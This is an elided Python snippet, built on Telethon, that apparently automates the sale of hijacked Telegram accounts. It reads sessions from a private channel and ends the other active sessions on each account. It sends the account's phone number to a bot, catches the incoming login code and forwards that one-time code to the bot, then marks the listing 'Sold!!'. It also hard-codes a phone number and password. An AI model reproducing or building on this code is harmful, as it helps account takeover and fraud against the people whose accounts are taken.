...
mClient = TelegramClient('me', api_id, api_hash).start(phone='+8801778855999',password=pswd,max_attempts=10)
...
all_ssns = []
for message in mClient.get_messages(-1002576914746, None):
    ...
    if (
        ...
        if kill_others(client) == True:
            ...
            mClient.send_message('@UoropeIN6_bot', message='+'+cPhn)
            ...
            async def newMessage(event):
                if event.raw_text.startswith("Login code:"):
                    ...
                    time.sleep(5)
                    await mClient.send_message('@UoropeIN6_bot', otp)
            ...
            msgID = message.id
            mClient.send_message(-1002576914746, message='Sold!!', reply_to=msgID)
